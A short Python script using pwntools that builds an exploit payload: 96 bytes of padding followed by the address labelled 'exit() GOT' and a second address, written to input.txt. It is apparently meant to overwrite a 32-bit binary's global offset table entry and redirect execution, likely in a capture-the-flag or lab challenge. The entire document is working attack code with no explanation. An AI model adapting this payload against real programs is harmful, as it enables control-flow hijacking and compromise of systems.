#!/usr/bin/env python3

from pwn import *
payload1 = flat([
    # padding
    b"A" * 96,
    # exit() GOT
    p32(0x0804c028),
    p32(134517475)      
])     
with open("input.txt", "wb") as f:
    f.write(payload1)